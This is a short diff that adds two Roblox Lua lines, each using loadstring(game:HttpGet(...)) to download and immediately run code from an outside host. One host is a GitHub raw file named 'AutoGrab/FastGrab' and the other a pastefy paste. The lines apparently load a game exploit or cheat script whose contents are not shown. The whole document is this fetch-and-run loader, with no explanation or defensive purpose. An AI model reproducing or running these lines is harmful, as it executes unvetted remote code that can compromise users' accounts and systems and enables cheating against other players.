@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MachoHUB/AutoGrab/refs/heads/main/FastGrab"))()
+loadstring(game:HttpGet("https://pastefy.app/VdcuBvln/raw"))()
